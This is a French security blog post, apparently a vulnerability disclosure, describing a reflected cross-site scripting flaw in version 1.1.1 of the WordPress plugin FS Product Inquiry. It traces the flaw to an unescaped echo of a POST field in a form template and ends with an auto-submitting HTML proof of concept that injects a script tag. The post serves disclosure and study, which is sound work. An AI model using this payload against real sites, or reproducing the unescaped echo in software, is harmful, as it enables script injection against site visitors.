---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress FS Product Inquiry"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [FS Product Inquiry](https://wordpress.org/plugins/fs-product-inquiry/) se présente de cette façon :

> FS Product Inquiry is a WordPress product inquiry plugin. This plugin is useful for product inquiry and also store all the data in the database with email so we can use these emails as subscribe or for other product marketing purposes.

La version testée est la 1.1.1 et date d'il y a 3 ans au moment de ces lignes.

## La vulnérabilité

En plus de [la faille SQL aussi mentionnée sur ce blog]({% link _posts/2023-12-18-Injection-SQL-dans-le-plugin-Wordpress-FS-Product-Inquiry.md %}), le plugin est aussi vulnérable à une faille XSS.

C'est là encore lié à la fonction `fspi_show_products_list` dans `includes/class-fs-products.php`.

Cette fonction inclus un template `fspi-show-product-list.php` :

```php
/*
* Define function to show product list
*/
function fs_get_all_products(){
    /*
    * Add filter to update wp_query for product search
    */
    wp_enqueue_script('jquery');

    add_filter( 'posts_where', array($this,'fspi_post_title_filter'), 10, 2 );
    $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
    $product_name = !empty($_POST['product_name'])?trim(sanitize_text_field($_POST['product_name'])):'';
    $args = array( 'post_type' => 'fspi-products', 'posts_per_page' => 9, 'paged' => $paged, 'fs_search_post_title' => $product_name);
    $loop = new WP_Query($args);
    /*
    * Remove filter to update wp_query for product search
    */
    remove_filter( 'posts_where', array($this,'fspi_post_title_filter'), 10 );
    include FSPI_BASE_DIR.'/templates/public/fspi-show-product-list.php';
}
```

Le template lui-même inclus un autre template :

```php
<!-- Modal body -->
<div class="modal-body">
  <button type="button" class="close" data-dismiss="modal">&times;</button>
 <?php include FSPI_BASE_DIR.'templates/public/fspi-show-inquiry-form.php'; ?>
</div>
```

C'est dans ce dernier qu'on trouve un simple `echo` d'une variable non vérifiée :

```php
<input type="hidden" name="_fs_product_id" value="<?php if(!empty($_POST['_fs_product_id'])){echo $_POST['_fs_product_id'];} ?>">
```

PoC :

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/?page_id=5">
        <input type="hidden" name="_fs_product_id" value="&quot;&gt;&lt;ScRiPt&gt;alert(/XSS/)&lt;/sCrIpT&gt;" />
        <input type="hidden" name="_fs_name" value="default" />
        <input type="hidden" name="_fs_email" value="wapiti2021@mailinator.com" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```
